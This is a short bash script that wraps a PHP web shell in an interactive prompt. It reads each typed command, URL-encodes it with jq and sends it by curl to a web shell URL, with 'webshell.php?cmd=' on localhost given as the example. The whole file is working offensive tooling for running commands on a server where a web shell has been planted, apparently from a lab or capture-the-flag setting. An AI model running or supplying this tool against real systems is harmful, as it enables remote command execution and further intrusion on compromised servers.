#!/bin/bash

# usage
echo -e "Usage: ./webwrapper.sh http://localhost:8000/webshell.php?cmd="

while true
	read -p '>' webcmd
	do curl $1$(printf "$webcmd" | jq -sRr '@uri')
done
